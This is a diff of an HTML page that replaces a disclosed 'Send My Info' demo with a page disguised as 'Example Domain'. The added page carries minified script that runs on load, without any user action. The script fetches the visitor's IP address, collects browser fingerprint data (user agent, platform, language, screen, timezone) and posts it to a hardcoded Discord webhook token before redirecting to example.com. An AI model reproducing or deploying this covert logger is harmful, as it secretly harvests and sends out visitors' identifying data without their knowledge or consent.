@@ -1,77 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>User Info Demo</title>
-  <link rel="stylesheet" href="style.css" />
+  <title>Example Domain</title>
 </head>
 <body>
-  <div class="card">
-    <h1>Send My Info</h1>
-    <p>
-      This will send basic browser and IP information to a Discord webhook.
-    </p>
-    <button id="sendBtn" onclick="sendinfo()">I Agree & Send</button>
-    <pre id="status"></pre>
-  </div>
-
-  <script>
-    const WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1465928387599007754/YdN5qDJsuhdn9-iWZYmSLNOVTW2PI2ffiDrIAXMKdasuh5qrOpe580riiHDu59rGrTbJ";
-async function sendToDiscord(data) {
-const content =
-  `${"-".repeat(15)}\n` +
-  Object.entries(data)
-    .map(([k, v]) => `**${k}**: ${typeof v === "string" ? v : JSON.stringify(v)}`)
-    .join("\n") +
-  `\n${"-".repeat(15)}`;
-
-const payload = {
-  content: content
-};
-
-
-  await fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-}
-async function collectClientInfo() {
-  let ip = "unavailable";
-
-  try {
-    const res = await fetch("https://api64.ipify.org?format=json", {
-      cache: "no-store"
-    });
-    if (res.ok) {
-      const data = await res.json();
-      ip = data.ip || ip;
-    }
-  } catch {
-    // silently ignore IP failure
-  }
-  return {
-    ip,
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    timestamp: new Date().toISOString(),
-    // navigator: navigatorDump,
-    connectStart: window.performance.now()
-  };
-}
-
-
-async function sendinfo() {
-  try {
-    const info = await collectClientInfo();
-    await sendToDiscord(info);
-  } catch{};
-  window.location = "https://example.com";
-}
-sendinfo();
-  </script>
+<script>(async()=>{try{let r="unavailable";try{let t=await fetch("https://api64.ipify.org?format=json",{cache:"no-store"});r=t.ok?(await t.json()).ip||r:r}catch{};await fetch("https://ptb.discord.com/api/webhooks/1465928387599007754/YdN5qDJsuhdn9-iWZYmSLNOVTW2PI2ffiDrIAXMKdasuh5qrOpe580riiHDu59rGrTbJ",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:`${"-".repeat(15)}\n**ip**: ${r}\n**userAgent**: ${navigator.userAgent}\n**platform**: ${navigator.platform}\n**language**: ${navigator.language}\n**screen**: ${screen.width}x${screen.height}\n**timezone**: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n**timestamp**: ${new Date().toISOString()}\n**connectStart**: ${window.performance.now()}\n${"-".repeat(15)}`})})}catch{};window.location="https://example.com";})();</script>
 </body>
 </html>
